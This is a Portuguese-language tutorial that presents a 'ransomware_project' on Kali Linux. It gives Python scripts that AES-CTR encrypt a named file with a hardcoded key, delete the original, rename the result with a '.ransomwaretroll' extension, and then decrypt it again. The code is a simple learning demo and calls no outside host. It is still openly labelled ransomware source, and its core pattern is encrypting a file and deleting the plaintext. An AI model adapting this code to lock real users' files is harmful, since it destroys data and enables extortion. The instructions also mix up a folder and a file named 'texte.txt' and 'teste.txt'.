# Cripitografar arquivos ultilizando a linguagem pyton no kali linux

## Crie uma pasta principal
ransomware_project.

## Dentro dela, crie dois arquivos Python:
encrypter.py (para criptografar)
decrypter.py ( para descriptografar)
  
## Crie uma pasta texte.txt 
coloque o texto que quiser dentro

## Dentro da encrypter.py coloque:

import os
import pyaes

## Nome do arquivo a ser criptografado
file_name = "teste.txt"

## Abrir o arquivo e ler os dados

with open(file_name, "rb") as file:
    file_data = file.read()

## Remover o arquivo original
os.remove(file_name)

## Chave de criptografia (deve ter 16, 24 ou 32 bytes)
key = b"testeransomwares"

## Criar o objeto de criptografia
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar os dados
crypto_data = aes.encrypt(file_data)

## Salvar o arquivo criptografado
new_file_name = file_name + ".ransomwaretroll"
with open(new_file_name, "wb") as new_file:
    new_file.write(crypto_data)

print(f"Arquivo criptografado e salvo como {new_file_name}")

## Dentro da decrypter.py coloque:

import os
import pyaes

## Nome do arquivo criptografado
file_name = "teste.txt.ransomwaretroll"

## Abrir o arquivo criptografado e ler os dados
with open(file_name, "rb") as file:
    file_data = file.read()

## Chave de descriptografia (mesma usada na criptografia)
key = b"testeransomwares"

## Criar o objeto de descriptografia
aes = pyaes.AESModeOfOperationCTR(key)

## Descriptografar os dados
decrypt_data = aes.decrypt(file_data)

## Remover o arquivo criptografado
os.remove(file_name)

## Criar o arquivo descriptografado
original_file_name = "teste.txt"
with open(original_file_name, "wb") as new_file:
    new_file.write(decrypt_data)

print(f"Arquivo descriptografado salvo como {original_file_name}")


## Para executar o script de criptografia, abra o terminal ou prompt de comando, navegue até a pasta onde estão os arquivos e digite:

python encrypter.py

## Para descriptografar o arquivo, execute:

python decrypter.py





